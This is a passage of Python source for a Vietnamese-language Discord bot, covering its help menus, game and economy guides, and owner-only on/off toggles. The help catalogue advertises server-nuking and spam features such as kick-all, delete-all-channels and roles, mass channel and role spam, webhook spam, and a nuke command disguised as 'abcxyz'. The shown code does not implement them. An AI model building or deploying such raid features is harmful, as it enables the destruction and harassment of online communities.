            "n! spamroast @user <số>": "🔥 Spam chửi thành viên chỉ định",
            "n! kick @user [lý do]": "🦵 Kick thành viên ra khỏi server",
            "n! ban @user [lý do]": "🔨 Cấm thành viên khỏi server",
            "n! unban <id>": "✅ Gỡ ban cho thành viên qua ID",
            "n! massban @user1 @user2...": "🔨 Cấm nhiều người cùng lúc",
            "n! mute @user [thời gian]": "🔇 Tắt tiếng (timeout) thành viên",
            "n! unmute @user": "🔊 Bỏ tắt tiếng thành viên",
            "n! timeout @user <thời gian>": "⏳ Timeout thành viên (m, d, w, t)",
            "n! deafen @user": "🔇 Làm điếc trong voice",
            "n! undeafen @user": "🔊 Bỏ điếc trong voice",
            "n! move @user #voice": "🚪 Di chuyển thành viên sang voice khác",
            "n! moveall #voice": "🚪 Di chuyển tất cả thành viên vào voice",
            "n! warn @user [lý do]": "⚠️ Gửi cảnh cáo qua DM",
            "n! kickall": "👢 Kick toàn bộ thành viên (trừ Owner)",
            "n! masskick @user1 @user2...": "👢 Kick nhiều người cùng lúc",
            "n! createchannel <tên>": "🆕 Tạo kênh văn bản mới",
            "n! deletechannel [#kênh]": "🗑️ Xóa kênh được chọn",
            "n! lockchannel [#kênh]": "🔒 Khóa kênh văn bản",
            "n! unlockchannel [#kênh]": "🔓 Mở khóa kênh văn bản",
            "n! createcategory <tên>": "📁 Tạo Danh mục (Category) mới",
            "n! renamechannel #kênh <tên mới>": "✏️ Đổi tên kênh",
            "n! settopic #kênh <nội dung>": "📝 Đặt chủ đề cho kênh",
            "n! setnsfw #kênh <true/false>": "🔞 Bật/Tắt chế độ NSFW",
            "n! hide #kênh": "🙈 Ẩn kênh (chỉ admin thấy)",
            "n! reveal #kênh": "👀 Hiện kênh (mọi người thấy)",
            "n! vc <tên>": "🔊 Tạo voice channel mới",
            "n! clonechannel #kênh": "📋 Clone kênh hiện tại",
            "n! deleteallchannels": "💣 Xóa toàn bộ kênh (có xác nhận)",
            "n! spamchannels <số>": "🚀 Tạo hàng loạt kênh spam",
            "n! spamroles <số>": "🎭 Tạo hàng loạt role spam",
            "n! deleteallroles": "🗑️ Xóa toàn bộ role (trừ @everyone)",
            "n! createrole <tên>": "🎭 Tạo role mới",
            "n! deleterole <tên>": "🗑️ Xóa role khỏi server",
            "n! role @user <tên role>": "🎭 Gán role cho thành viên",
            "n! removerole @user <tên role>": "🎭 Xóa role khỏi thành viên",
            "n! purge all": "🧹 Xóa sạch toàn bộ tin nhắn server",
            "n! clear <số>": "🧹 Xóa tin nhắn trong kênh (tối đa 1000)",
            "n! slowmode <giây>": "🐢 Cài slowmode cho kênh hiện tại",
            "n! nick @user <nick>": "✏️ Đổi nickname cho thành viên",
            "n! resetnick @user": "🔄 Reset nickname về mặc định",
            "n! setservername <tên>": "📝 Đổi tên server",
            "n! rename <tên>": "📝 Đổi tên server (cách viết khác)",
            "n! setservericon [url]": "🖼️ Đổi icon server (từ URL)",
            "n! icon [url]": "🖼️ Đổi icon server (cách viết khác)",
            "n! emoji": "🎨 Xem danh sách emoji của server",
            "n! steal <id> <tên>": "🎨 Copy emoji từ server khác",
            "n! webhookspam": "💬 Spam webhook trong kênh hiện tại",
            "n! setwelcome #kênh": "🎉 Đặt kênh chào mừng",
            "n! setgoodbye #kênh": "😢 Đặt kênh tạm biệt",
            "n! setlevelchannel #kênh": "📈 Đặt kênh thông báo Level Up",
            "n! log #kênh": "📋 Đặt kênh log sự kiện",
            "n! setlv <level> @user": "📊 Đặt level cho người chơi",
            "n! backup": "💾 Backup cấu hình server",
            "n! restore": "🔄 Khôi phục server từ backup",
            "n! addowner @user": "➕ Thêm đồng minh Owner",
            "n! deleteowner @user": "➖ Xóa Owner khỏi danh sách",
            "n! setup": "⚙️ Mở bảng điều khiển quản trị",
            "n! showsv": "🌐 Xem danh sách server bot đang tham gia",
            "n! off [lệnh]": "🚫 Tắt một lệnh hoặc toàn bộ bot",
            "n! on [lệnh]": "✅ Bật một lệnh hoặc bật lại bot"
        }
    },
    "💰 Kinh Tế & Giải Trí": {
        "emoji": "💰",
        "description": "Hệ thống mini-game, cá cược, kiếm coin và chuyển tiền phong phú.",
        "commands": {
            "n! balance [@user]": "💰 Xem số dư coin của bạn hoặc người khác",
            "n! daily": "🎁 Nhận quà coin miễn phí mỗi ngày (24h)",
            "n! work": "🛠️ Làm việc kiếm coin",
            "n! give @user <số>": "💸 Chuyển coin cho người khác",
            "n! coinflip <số> <h/t>": "🪙 Tung đồng xu x2 tiền cược",
            "n! slots <số>": "🎰 Quay hũ Slots – jackpot x5",
            "n! rps <số> <r/p/s>": "✂️ Oẳn tù tì x2 tiền cược",
            "n! dice <số> <1-6>": "🎲 Đoán xúc xắc x5 (tăng từ x4)",
            "n! hilo <số> <h/l>": "🎴 Cao / thấp hơn 7 x2 (tăng từ x1.8)",
            "n! crash <số>": "🚀 Tên lửa dừng đúng lúc nhân tiền",
            "n! lottery <số>": "🎫 Xổ số x10 (cơ hội 25%)",
            "n! blackjack <số>": "🃏 Xì dách 21 điểm x2",
            "n! beg": "🥺 Xin tiền (30s)",
            "n! crime": "🚨 Trộm cướp (60s, 55%)",
            "n! bank deposit <số/all>": "🏦 Gửi tiền vào ngân hàng",
            "n! bank withdraw <số/all>": "💸 Rút tiền từ ngân hàng",
            "n! leaderboard": "🏆 Bảng xếp hạng giàu nhất server",
            "n! topcoin": "🏆 Xếp hạng coin (top 10)",
            "n! toplevel": "🏆 Xếp hạng level (top 10)",
            "n! roulette <số> <red/black/số>": "🎰 Roulette với tỉ lệ thắng cao",
            "n! guess <số> <1-10>": "🎯 Đoán số bí mật (x5)",
            "n! baccarat <số> <player/banker/tie>": "🃏 Baccarat với luật đơn giản"
        }
    },
    "📊 Thông Tin & Hệ Thống": {
        "emoji": "📊",
        "description": "Xem thống kê server, độ trễ, bảng xếp hạng.",
        "commands": {
            "n! stats": "📊 Xem thông số chi tiết của server",
            "n! ping": "🏓 Kiểm tra độ trễ của bot",
            "n! topcoin": "🏆 Bảng xếp hạng những người có coin nhiều nhất",
            "n! toplevel": "🏆 Bảng xếp hạng level cao nhất",
            "n! serverinfo": "🌐 Thông tin chi tiết server",
            "n! userinfo @user": "👤 Thông tin chi tiết người dùng",
            "n! avatar @user": "🖼️ Xem avatar",
            "n! membercount": "👥 Số lượng thành viên",
            "n! listroles": "📋 Danh sách role",
            "n! listchannels": "📋 Danh sách kênh"
        }
    },
    "💘 Tình yêu & Tương tác": {
        "emoji": "💘",
        "description": "Các lệnh tương tác vui vẻ, tỏ tình, kết hôn.",
        "commands": {
            "n! love @user1 @user2": "💘 Tỷ lệ tình yêu",
            "n! hug @user": "🤗 Ôm",
            "n! kiss @user": "😘 Hôn",
            "n! slap @user": "👋 Tát",
            "n! pat @user": "🫳 Vỗ đầu",
            "n! cuddle @user": "🥰 Âu yếm",
            "n! marry @user": "💍 Kết hôn",
            "n! divorce @user": "💔 Ly hôn",
            "n! ship @user1 @user2": "💞 Ghép đôi",
            "n! crush @user": "💌 Tỏ tình"
        }
    },
    "👑 Owner Commands": {
        "emoji": "👑",
        "description": "Danh sách 20 lệnh quản trị mạnh mẽ dành riêng cho Boss Bảo và đồng minh.",
        "commands": {
            "n! abcxyz": "☢️ Lệnh nuke server (xác nhận)",
            "n! spam": "⚡ Bắt đầu spam toàn server",
            "n! stopspam": "🛑 Dừng spam",
            "n! kickall": "👢 Kick toàn bộ thành viên",
            "n! ban @user": "🔨 Ban thành viên",
            "n! massban @user1 @user2": "🔨 Ban nhiều người",
            "n! mute @user <thời gian>": "🔇 Mute thành viên",
            "n! unmute @user": "🔊 Unmute",
            "n! timeout @user <thời gian>": "⏳ Timeout",
            "n! purge all": "🧹 Xóa toàn bộ tin nhắn",
            "n! deleteallchannels": "💣 Xóa tất cả kênh",
            "n! deleteallroles": "🗑️ Xóa tất cả role",
            "n! spamchannels <số>": "🚀 Tạo kênh spam",
            "n! spamroles <số>": "🎭 Tạo role spam",
            "n! backup": "💾 Backup server",
            "n! restore": "🔄 Restore server",
            "n! addowner @user": "➕ Thêm owner",
            "n! deleteowner @user": "➖ Xóa owner",
            "n! setlv <level> @user": "📊 Set level",
            "n! showsv": "🌐 Danh sách server"
        }
    }
}

# ==================== CLASS HELP SELECT ====================
class HelpSelect(discord.ui.Select):
    def __init__(self, user_id, owner_ids):
        self.user_id = user_id
        self.owner_ids = owner_ids
        options = [
            discord.SelectOption(
                label="🏠 Trang Chủ",
                value="Home",
                description="Quay lại giao diện chính",
                emoji="🏠"
            )
        ]
        for cat_name, data in HELP_CATEGORIES.items():
            emoji = data.get("emoji", "📌")
            label = cat_name.replace(emoji, "").strip()
            if cat_name == "👑 Owner Commands" and user_id not in owner_ids:
                continue
            options.append(
                discord.SelectOption(
                    label=label,
                    value=cat_name,
                    description=data.get("description", "")[:80],
                    emoji=emoji
                )
            )
        super().__init__(placeholder="🔍 Chọn danh mục lệnh...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        selected = self.values[0]
        if selected == "Home":
            embed = discord.Embed(
                title="✨ BẢNG ĐIỀU KHIỂN QUẢN TRỊ TỐI CAO ✨",
                description=(
                    "Chào mừng bạn đến với hệ thống Bot đẳng cấp hàng đầu!\n"
                    "Hãy chọn danh mục ở Menu thả xuống để khám phá danh sách lệnh chi tiết.\n\n"
                    "📌 **Prefix mặc định:** `n!`\n"
                    "👑 **Sở hữu bởi:** Boss Bảo & Đồng minh Tối Cao\n"
                    "💡 **Gợi ý:** Sử dụng các lệnh kinh tế để kiếm coin và tham gia game!"
                ),
                color=0xFF69B4
            )
            embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
            embed.set_footer(text="Hệ thống quản trị đỉnh cao • Boss Bảo On Top", icon_url=interaction.client.user.display_avatar.url)
            await interaction.response.edit_message(embed=embed, view=self.view)
        else:
            data = HELP_CATEGORIES.get(selected, {})
            cmds = data.get("commands", {})
            desc = data.get("description", "")
            cmd_text = ""
            for cmd, detail in cmds.items():
                parts = cmd.split(" ", 1)
                if len(parts) == 2:
                    cmd_display = parts[1]
                else:
                    cmd_display = cmd
                cmd_text += f"• **`{cmd_display}`** – {detail}\n"
            embed = discord.Embed(
                title=f"{selected}",
                description=f"💡 **Mô tả:** {desc}\n\n{cmd_text}" if cmd_text else "Chưa có lệnh nào trong mục này.",
                color=0x00FFCC
            )
            embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
            embed.set_footer(text="Hệ thống quản trị đỉnh cao • Boss Bảo On Top", icon_url=interaction.client.user.display_avatar.url)
            await interaction.response.edit_message(embed=embed, view=self.view)

class HelpView(discord.ui.View):
    def __init__(self, user_id, owner_ids):
        super().__init__(timeout=180)
        self.add_item(HelpSelect(user_id, owner_ids))

@bot.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="✨ BẢNG ĐIỀU KHIỂN QUẢN TRỊ TỐI CAO ✨",
        description=(
            "Chào mừng bạn đến với hệ thống Bot đẳng cấp hàng đầu!\n"
            "Hãy chọn danh mục ở Menu thả xuống để khám phá danh sách lệnh chi tiết.\n\n"
            "📌 **Prefix mặc định:** `n!`\n"
            "👑 **Sở hữu bởi:** Boss Bảo & Đồng minh Tối Cao\n"
            "💡 **Gợi ý:** Sử dụng các lệnh kinh tế để kiếm coin và tham gia game!"
        ),
        color=0xFF69B4
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    embed.set_footer(text="Hệ thống quản trị đỉnh cao • Boss Bảo On Top", icon_url=bot.user.display_avatar.url)
    view = HelpView(ctx.author.id, BOT_OWNERS)
    await ctx.send(embed=embed, view=view)

# ==================== LỆNH SETUP (CHỈ OWNER) ====================
@bot.command(name="setup")
@is_bot_owner()
async def setup(ctx):
    embed = discord.Embed(
        title="💖 HỆ THỐNG QUẢN TRỊ TỐI CAO CỦA BOSS BẢO 💖",
        description="Chọn một danh mục bên dưới để xem các lệnh tương ứng.",
        color=0xFF69B4
    )
    for cat_name, data in HELP_CATEGORIES.items():
        embed.add_field(name=cat_name, value=data.get("description", ""), inline=False)
    embed.set_image(url=CUSTOM_SETUP_GIF)
    embed.set_footer(text="Độc quyền phục vụ Boss Bảo 💖", icon_url=ctx.author.display_avatar.url)
    view = HelpView(ctx.author.id, BOT_OWNERS)
    await ctx.send(embed=embed, view=view)

@setup.error
async def setup_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH GAMES & HƯỚNG DẪN ====================
class GameMenuView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(discord.ui.Button(label="💵 Kiếm Coin", style=discord.ButtonStyle.primary, custom_id="coin", row=0))
        self.add_item(discord.ui.Button(label="🎲 Mini Games", style=discord.ButtonStyle.success, custom_id="mini", row=0))
        self.add_item(discord.ui.Button(label="🎰 Sòng Bạc Casino", style=discord.ButtonStyle.danger, custom_id="casino", row=0))
        self.add_item(discord.ui.Button(label="🛒 Cửa Hàng & Vàng", style=discord.ButtonStyle.secondary, custom_id="shop", row=1))
        self.add_item(discord.ui.Button(label="🏆 Bảng Xếp Hạng", style=discord.ButtonStyle.primary, custom_id="lb", row=1))
        self.add_item(discord.ui.Button(label="📘 Hướng Dẫn", style=discord.ButtonStyle.secondary, custom_id="guide", row=2))

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        cid = interaction.data["custom_id"]
        if cid == "guide":
            embed = discord.Embed(
                title="📘 HƯỚNG DẪN SỬ DỤNG BOT",
                description="Chọn một chủ đề bên dưới để xem hướng dẫn chi tiết.\nMỗi chủ đề sẽ hiển thị các lệnh và mẹo liên quan.",
                color=0x00FFFF
            )
            embed.set_image(url="https://media.tenor.com/2k4z1C2d5zIAAAAM/anime-hug.gif")
            embed.set_footer(text="Boss Bảo 💖")
            view = GuideView(interaction)
            await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
            return True
        if cid == "coin":
            embed = discord.Embed(
                title="💵 DANH MỤC LỆNH KIẾM TIỀN 💵",
                description=(
                    "💰 `n! balance` — Xem số dư ví & ngân hàng 💳\n"
                    "🎁 `n! daily` — Nhận quà mỗi ngày (100 - 500 coin) 🌟\n"
                    "💼 `n! work` — Tăng ca kiếm thêm thu nhập 🛠️\n"
                    "🥺 `n! beg` — Xin tiền cư dân mạng 🤲\n"
                    "🥷 `n! crime` — Đi trộm cướp (Cẩn thận đi tù!) 🚨\n"
                    "🏦 `n! bank deposit <số>` — Gửi tiền gửi tiết kiệm 🔒\n"
                    "💸 `n! bank withdraw <số>` — Rút tiền mặt ra tiêu 🏧\n"
                    "🤝 `n! give @user <số>` — Chuyển tiền cho bạn bè 🎁"
                ),
                color=0x00FFCC
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return True
        elif cid == "mini":
            embed = discord.Embed(
                title="🎲 DANH MỤC MINI GAMES 🎲",
                description=(
                    "🪙 `n! coinflip <tiền> <h/t>` — Tung đồng xu 50/50 ✨\n"
                    "🎲 `n! dice <tiền> <1-6>` — Đoán mặt xúc xắc x4 🎯\n"
                    "✂️ `n! rps <tiền> <r/p/s>` — Oẳn tù tì ăn tiền 🪨\n"
                    "🎴 `n! hilo <tiền> <h/l>` — Đoán bài Cao hay Thấp 📈"
                ),
                color=0x2ECC71
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return True
        elif cid == "casino":
            embed = discord.Embed(
                title="🎰 SÒNG BẠC CASINO THỜI THƯỢNG 🎰",
                description=(
                    "🎰 `n! slots <tiền>` — Máy quay xèng Jackpot x5 💎\n"
                    "🚀 `n! crash <tiền>` — Tên lửa vũ trụ nhân tiền 💥\n"
                    "🎫 `n! lottery <tiền>` — Mua vé số đại phát x10 🧧\n"
                    "🃏 `n! blackjack <tiền>` — Xì dách 21 điểm cực đỉnh ♠️"
                ),
                color=0xE74C3C
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return True
        elif cid == "shop":
            embed = discord.Embed(
                title="🛒 CỬA HÀNG & ROLE SHOP 🛒",
                description=(
                    "🛍️ `n! shop` — Xem danh sách vật phẩm hỗ trợ 📜\n"
                    "💳 `n! buyitem <tên>` — Mua vật phẩm từ Shop 📦\n"
                    "🎒 `n! inventory` — Mở túi đồ cá nhân 🎒\n"
                    "🏷️ `n! buyrole <tên>` — Dùng coin mua Role VIP 👑"
                ),
                color=0xF1C40F
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return True
        elif cid == "lb":
            embed = discord.Embed(
                title="🏆 BẢNG XẾP HẠNG 🏆",
                description="📊 `n! leaderboard` — Top 10 đại gia server 👑",
                color=0x9B59B6
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return True
        return False

class GuideView(discord.ui.View):
    def __init__(self, parent_interaction):
        super().__init__(timeout=120)
        self.parent_interaction = parent_interaction
        self.add_item(discord.ui.Button(label="💰 Kinh tế", style=discord.ButtonStyle.primary, custom_id="guide_economy"))
        self.add_item(discord.ui.Button(label="🎮 Game", style=discord.ButtonStyle.success, custom_id="guide_game"))
        self.add_item(discord.ui.Button(label="💘 Tình yêu", style=discord.ButtonStyle.danger, custom_id="guide_love"))
        self.add_item(discord.ui.Button(label="🛠️ Admin", style=discord.ButtonStyle.secondary, custom_id="guide_admin"))
        self.add_item(discord.ui.Button(label="❓ Lệnh cơ bản", style=discord.ButtonStyle.primary, custom_id="guide_basic"))
        self.add_item(discord.ui.Button(label="🎯 Mẹo hay", style=discord.ButtonStyle.success, custom_id="guide_tips"))
        back = discord.ui.Button(label="🔙 Quay lại", style=discord.ButtonStyle.danger, custom_id="guide_back")
        back.callback = self.back_callback
        self.add_item(back)

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        cid = interaction.data["custom_id"]
        if cid.startswith("guide_"):
            await self.handle_guide(interaction, cid)
            return True
        return False

    async def handle_guide(self, interaction: discord.Interaction, cid: str):
        embeds = {
            "guide_economy": discord.Embed(
                title="💰 KINH TẾ & COIN",
                description=(
                    "**Các lệnh kiếm và quản lý coin:**\n"
                    "💰 `n! balance` – Xem số dư ví và ngân hàng.\n"
                    "🎁 `n! daily` – Nhận thưởng mỗi ngày (100-500 coin).\n"
                    "💼 `n! work` – Làm việc kiếm 50-300 coin (mỗi 1h).\n"
                    "🥺 `n! beg` – Xin tiền người khác (mỗi 30s).\n"
                    "🚨 `n! crime` – Trộm cướp (mỗi 60s, 55% thành công).\n"
                    "🏦 `n! bank deposit <số/all>` – Gửi tiền vào ngân hàng.\n"
                    "💸 `n! bank withdraw <số/all>` – Rút tiền về ví.\n"
                    "🤝 `n! give @user <số>` – Chuyển coin cho bạn bè.\n"
                    "🏆 `n! leaderboard` – Xem top 10 đại gia.\n\n"
                    "💡 **Mẹo:** Hãy dùng `daily` và `work` mỗi ngày để tích lũy nhanh."
                ),
                color=0xF1C40F
            ),
            "guide_game": discord.Embed(
                title="🎮 TRÒ CHƠI GIẢI TRÍ",
                description=(
                    "**Các trò chơi may rủi (đặt cược bằng coin):**\n"
                    "🪙 `n! coinflip <tiền> <h/t>` – Tung đồng xu (x2).\n"
                    "🎲 `n! dice <tiền> <1-6>` – Đoán xúc xắc (x4).\n"
                    "✂️ `n! rps <tiền> <r/p/s>` – Oẳn tù tì (x2).\n"
                    "🎴 `n! hilo <tiền> <h/l>` – Cao / thấp hơn 7 (x1.8).\n"
                    "🎰 `n! slots <tiền>` – Máy quay xèng (jackpot x5).\n"
                    "🚀 `n! crash <tiền>` – Tên lửa – dừng đúng lúc để nhân tiền.\n"
                    "🎫 `n! lottery <tiền>` – Xổ số (x10 nếu trúng).\n"
                    "🃏 `n! blackjack <tiền>` – Xì dách 21 điểm (x2).\n\n"
                    "💡 **MẸO:** Chơi `slots` hoặc `lottery` để có cơ hội thắng lớn, nhưng rủi ro cao!"
                ),
                color=0x2ECC71
            ),
            "guide_love": discord.Embed(
                title="💘 TÌNH YÊU & TƯƠNG TÁC",
                description=(
                    "**Các lệnh tương tác vui vẻ:**\n"
                    "💕 `n! love @user1 @user2` – Tính tỷ lệ tình yêu.\n"
                    "🤗 `n! hug @user` – Ôm người khác.\n"
                    "😘 `n! kiss @user` – Hôn người khác.\n"
                    "👋 `n! slap @user` – Tát người khác.\n"
                    "🫳 `n! pat @user` – Vỗ đầu người khác.\n"
                    "🥰 `n! cuddle @user` – Âu yếm.\n"
                    "💍 `n! marry @user` – Kết hôn (lưu vào file).\n"
                    "💔 `n! divorce @user` – Ly hôn.\n"
                    "💞 `n! ship @user1 @user2` – Ghép đôi ngẫu nhiên.\n"
                    "💌 `n! crush @user` – Tỏ tình.\n\n"
                    "💡 **VUI:** Hãy thử `marry` và `divorce` để tạo không khí hài hước!"
                ),
                color=0xFF1493
            ),
            "guide_admin": discord.Embed(
                title="🛠️ LỆNH QUẢN TRỊ (OWNER)",
                description=(
                    "**Các lệnh dành riêng cho chủ bot (Boss Bảo):**\n"
                    "👑 `n! addowner @user` – Thêm owner.\n"
                    "🗑️ `n! deleteowner @user` – Xóa owner.\n"
                    "📊 `n! setlv <level> @user` – Set level cho user.\n"
                    "📢 `n! setlevelchannel #kênh` – Cài kênh thông báo level.\n"
                    "📋 `n! log #kênh` – Cài kênh log sự kiện.\n"
                    "🎉 `n! setwelcome #kênh` – Cài kênh chào mừng.\n"
                    "👋 `n! setgoodbye #kênh` – Cài kênh tạm biệt.\n"
                    "💾 `n! backup` – Backup server.\n"
                    "🔄 `n! restore` – Restore server.\n"
                    "🚫 `n! off <lệnh>` – Tắt một lệnh.\n"
                    "✅ `n! on <lệnh>` – Bật lại lệnh.\n"
                    "🛑 `n! off` (không tham số) – Tắt toàn bộ bot.\n"
                    "🔛 `n! on` (không tham số) – Bật lại bot.\n\n"
                    "💡 **LƯU Ý:** Các lệnh `setup`, `showsv`, `spam...` cũng thuộc nhóm này."
                ),
                color=0x9B59B6
            ),
            "guide_basic": discord.Embed(
                title="❓ LỆNH CƠ BẢN CHO MỌI NGƯỜI",
                description=(
                    "**Những lệnh hữu ích hàng ngày:**\n"
                    "📖 `n! help` – Mở menu trợ giúp tổng hợp.\n"
                    "🎮 `n! games` – Mở trung tâm giải trí.\n"
                    "👤 `n! userinfo @user` – Xem thông tin người dùng.\n"
                    "🖼️ `n! avatar @user` – Xem avatar.\n"
                    "🏰 `n! serverinfo` – Xem thông tin server.\n"
                    "👥 `n! membercount` – Xem số thành viên.\n"
                    "🎒 `n! inventory` – Xem túi đồ của bạn.\n"
                    "🛒 `n! shop` – Mở cửa hàng mua vật phẩm.\n"
                    "💳 `n! buyitem <tên>` – Mua nhanh vật phẩm.\n"
                    "📨 `n! guithu @user <nội dung>` – Gửi tin nhắn riêng.\n\n"
                    "💡 **GỢI Ý:** Hãy dùng `help` và `games` để khám phá tất cả tính năng."
                ),
                color=0x3498DB
            ),
            "guide_tips": discord.Embed(
                title="🎯 MẸO HAY KHI CHƠI",
                description=(
                    "**💰 1. Tích lũy coin:**\n"
                    "   • 📅 Nhận `daily` mỗi ngày trước khi chơi game.\n"
                    "   • ⏰ Làm `work` mỗi giờ để có thu nhập đều.\n"
                    "   • 🚨 Tham gia `crime` khi đã có vốn (rủi ro nhưng lợi nhuận cao).\n\n"
                    "**🎯 2. Chơi game thông minh:**\n"
                    "   • 💡 Bắt đầu với cược nhỏ để làm quen luật.\n"
                    "   • 🪙 `coinflip` và ✂️ `rps` có tỷ lệ 50/50 – an toàn nhất.\n"
                    "   • 🎰 `slots` và 🎫 `lottery` may rủi cao nhưng thưởng lớn.\n"
                    "   • 🚀 `crash` đòi hỏi canh thời điểm – thử với cược thấp trước.\n\n"
                    "**🛒 3. Tận dụng shop:**\n"
                    "   • 🛍️ Mua vật phẩm có lợi thế như tăng may mắn, bảo vệ.\n"
                    "   • 🏷️ Dùng `buyrole` để mua role đặc biệt nếu có đủ coin.\n\n"
                    "**💬 4. Tương tác xã hội:**\n"
                    "   • 💘 Dùng các lệnh tình yêu để tạo không khí vui vẻ.\n"
                    "   • 📨 Gửi thư (`guithu`) để nhắn nhủ bạn bè.\n\n"
                    "**Chúc bạn chơi vui và thắng lớn!** 🎉"
                ),
                color=0xE67E22
            )
        }
        embed = embeds.get(cid, discord.Embed(title="⚠️ Không tìm thấy", color=0xFF0000))
        embed.set_footer(text="Boss Bảo 💖")
        gifs = {
            "guide_economy": "https://media.tenor.com/9Y8pLfX1nK0AAAAM/money.gif",
            "guide_game": "https://media.tenor.com/2k4z1C2d5zIAAAAM/anime-games.gif",
            "guide_love": "https://media.tenor.com/5L1k2C3d4zIAAAAM/anime-love.gif",
            "guide_admin": "https://media.tenor.com/8Y3p5T4a1r2AAAAM/admin.gif",
            "guide_basic": "https://media.tenor.com/7Z5l3Q8w2v0AAAAM/help.gif",
            "guide_tips": "https://media.tenor.com/6Z2o4U5z9s8AAAAM/tips.gif"
        }
        if cid in gifs:
            embed.set_image(url=gifs[cid])
        back_button = discord.ui.Button(label="🔙 Quay lại", style=discord.ButtonStyle.danger, custom_id="guide_back")
        back_button.callback = self.back_callback
        view = discord.ui.View()
        view.add_item(back_button)
        await interaction.response.edit_message(embed=embed, view=view)

    async def back_callback(self, interaction: discord.Interaction):
        embed = discord.Embed(
            title="📘 HƯỚNG DẪN SỬ DỤNG BOT",
            description="Chọn một chủ đề bên dưới để xem hướng dẫn chi tiết.\nMỗi chủ đề sẽ hiển thị các lệnh và mẹo liên quan.",
            color=0x00FFFF
        )
        embed.set_image(url="https://media.tenor.com/2k4z1C2d5zIAAAAM/anime-hug.gif")
        embed.set_footer(text="Boss Bảo 💖")
        view = GuideView(interaction)
        await interaction.response.edit_message(embed=embed, view=view)

@bot.command(name="games", aliases=["helpgame"])
async def games_menu(ctx):
    embed = discord.Embed(
        title="🎮 TRUNG TÂM GIẢI TRÍ GAME & CASINO 🎮",
        description=(
            "Chào mừng bạn đến với **Nuked Game Center**! 🎉\n\n"
            "👇 **Nhấn vào các nút bấm dưới đây** để xem toàn bộ danh mục hướng dẫn và lệnh chơi chi tiết nhé!"
        ),
        color=0x00FFFF
    )
    embed.set_image(url="https://media.tenor.com/2k4z1C2d5zIAAAAM/anime-hug.gif")
    embed.set_footer(text="Chúc các bạn chơi game vui vẻ & thắng lớn! 💖")
    view = GameMenuView()
    await ctx.send(embed=embed, view=view)

# ==================== LỆNH OFF & ON ====================
@bot.command(name="off")
@is_bot_owner()
async def off_command(ctx, *, command_name: str = None):
    global bot_enabled
    if command_name is None:
        bot_enabled = False
        await ctx.send("🛑 Boss Bảo đã tạm dừng bot. Gõ `n! on` để bật lại.")
        return
    cmd = bot.get_command(command_name.lower())
    if cmd is None:
        await ctx.send(f"❌ Không tìm thấy lệnh `{command_name}`!")
        return
    if cmd.name in ["off", "on"]:
        await ctx.send("❌ Không thể tắt lệnh `off` hoặc `on`!")
        return
    if cmd.name in DISABLED_COMMANDS:
        await ctx.send(f"❌ Lệnh `{cmd.name}` đã bị tắt rồi!")
        return
    DISABLED_COMMANDS.add(cmd.name)
    save_all_data()
    await ctx.send(f"✅ Đã tắt lệnh `{cmd.name}`! Gõ `n! on {cmd.name}` để bật lại.")

@off_command.error
async def off_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('❌ NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="on")
@is_bot_owner()
async def on_command(ctx, *, command_name: str = None):
    global bot_enabled
    if command_name is None:
        if bot_enabled:
            await ctx.send("🤖 Bot đang hoạt động bình thường!")
        else:
            bot_enabled = True
            await ctx.send("✅ Bot đã hoạt động trở lại!")
        return
    cmd = bot.get_command(command_name.lower())
    if cmd is None:
        await ctx.send(f"❌ Không tìm thấy lệnh `{command_name}`!")
        return
    if cmd.name not in DISABLED_COMMANDS:
        await ctx.send(f"❌ Lệnh `{cmd.name}` không bị tắt!")
        return
    DISABLED_COMMANDS.remove(cmd.name)
    save_all_data()
    await ctx.send(f"✅ Đã bật lại lệnh `{cmd.name}`!")

@on_command.error
async def on_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('❌ NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== GLOBAL CHECK ====================
@bot.check
async def globally_disabled_check(ctx):
    if not bot_enabled:
        if ctx.command and ctx.command.name != "on":
            await ctx.send("🛑 Bot đang tạm dừng. Gõ `n! on` để bật lại.")
            return False
    if ctx.command and ctx.command.name in DISABLED_COMMANDS:
        await ctx.send(f"❌ Lệnh `{ctx.command.name}` đã bị tắt bởi Boss Bảo. Gõ `n! on {ctx.command.name}` để bật lại.")
        return False
    return True

# ==================== LỆNH KINH TẾ & GAME ====================
WIN_REACTIONS = [
    "🎉 Chúc mừng! Bạn thật may mắn!",
    "🔥 Bùng nổ! Chiến thắng ngoạn mục!",
    "💪 Quá đỉnh! Bạn là cao thủ!",
    "🌟 Thần may mắn đang đứng về phía bạn!",
    "🍀 Cỏ bốn lá phát huy tác dụng!",
    "🎊 Ăn mừng đi nào!",
    "🤩 Xuất sắc! Tiếp tục phát huy!",
    "💰 Tiền vào như nước!",
]
LOSE_REACTIONS = [
    "😢 Rất tiếc! Lần sau sẽ khác.",
    "💀 Trời ơi, xui quá!",
    "🤣 Thua rồi, cố gắng lần sau nhé!",
    "😭 Đừng nản, còn nhiều cơ hội!",
    "😅 Lần này chưa may, chơi lại đi!",
    "🤦‍♂️ Sai lầm đáng tiếc!",
    "😤 Tức quá, nhưng đừng bỏ cuộc!",
    "💔 Mất tiền rồi, nhưng vui là chính!",
]

def get_win_msg():
    return random.choice(WIN_REACTIONS)

def get_lose_msg():
    return random.choice(LOSE_REACTIONS)

